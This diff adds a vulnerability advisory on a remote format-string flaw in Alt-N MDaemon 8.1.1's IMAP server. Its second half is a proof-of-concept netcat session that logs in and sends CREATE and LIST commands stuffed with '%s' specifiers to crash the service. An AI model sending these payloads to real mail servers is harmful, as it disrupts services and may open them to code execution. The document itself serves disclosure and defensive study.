@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/16854/info
+
+Alt-N MDaemon IMAP Server is affected by a remote format-string vulnerability. This issue is due to the application's failure to properly sanitize user-supplied input before using it in the format-specifier argument to a formatted printing function.
+
+This vulnerability may be leveraged to consume excessive CPU resources or to crash the service. Due to the nature of this issue, remote code execution is likely possible, although this has not been confirmed.
+
+Alt-N MDaemon 8.1.1 is reported to be vulnerable. Other versions are likely affected as well.
+
+M:\Distrib\nc>nc -v 127.0.0.1 143
+Blaster [127.0.0.1] 143 (imap) open
+* OK hack.com IMAP4rev1 MDaemon 8.1.1 ready
+0001 LOGIN "user" "password"
+0001 OK LOGIN completed
+0003 CREATE "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+%s%s%s%s%s"
+0003 OK CREATE completed
+0004 LIST "%s%s%s%s%s%s%s" "%s"
